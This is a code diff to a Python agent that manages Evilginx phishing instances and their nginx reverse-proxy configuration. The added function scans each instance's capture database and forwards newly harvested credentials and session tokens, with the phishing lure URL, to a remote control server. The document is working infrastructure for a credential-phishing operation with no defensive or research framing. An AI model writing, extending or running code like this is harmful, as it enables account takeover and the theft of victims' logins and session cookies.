@@ -21,6 +21,7 @@ from agent.config import AgentSettings, load_settings
 from agent.control import ControlClient, ControlError
 from agent.evilginx_manager import InstanceManager
 from agent.nginx_manager import render_http, render_sni, apply
+from agent.captures import CaptureState, drain_captures
 from agent.system import get_public_ip, ps_metrics
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(name)s: %(message)s")
@@ -71,6 +72,8 @@ def main() -> int:
 
     client = ControlClient(settings)
     manager = InstanceManager(settings)
+    cap_state = CaptureState(settings.capture_state_file)
+    cap_cache = cap_state.load()
     root_log = Path(settings.data_root).parent / "logs"
     root_log.mkdir(parents=True, exist_ok=True)
 
@@ -121,6 +124,9 @@ def main() -> int:
                 logger.info("%d pending job(s)", len(jobs))
             for job in jobs:
                 _handle_job(client, manager, job, root_log, config_dir_for)
+
+            _report_captures(client, manager, cap_cache)
+            cap_state.save(cap_cache)
 
             if args.onetime:
                 return 0
@@ -186,6 +192,32 @@ def _handle_job(client: ControlClient, manager: InstanceManager, job: dict, log_
             apply(sni, http, conf_path, http_path, apply=manager.settings.nginx_apply)
         except Exception as exc:
             logger.error("nginx config regeneration failed: %s", exc)
+
+
+def _report_captures(client: ControlClient, manager: InstanceManager, cap_cache: dict) -> None:
+    """Scan every provisioned instance's data.db and forward new captures.
+
+    cap_cache is the in-memory CaptureState dict, mutated by drain_captures; the
+    caller persists it after a successful run. Only new/changed session
+    snapshots are reported (creds-first, then token enrichment).
+    """
+    instances = manager.state.all()
+    for hostname, meta in instances.items():
+        config_dir = meta.get("config_dir")
+        if not config_dir:
+            continue
+        try:
+            captures = drain_captures(config_dir, cap_cache)
+        except Exception as exc:
+            logger.error("capture scan failed for %s: %s", hostname, exc)
+            continue
+        if not captures:
+            continue
+        try:
+            client.report_captures(hostname, meta.get("lure_url") or "", captures)
+            logger.info("reported %d capture(s) for %s", len(captures), hostname)
+        except ControlError as exc:
+            logger.warning("failed to report captures for %s: %s", hostname, exc)
 
 
 if __name__ == "__main__":
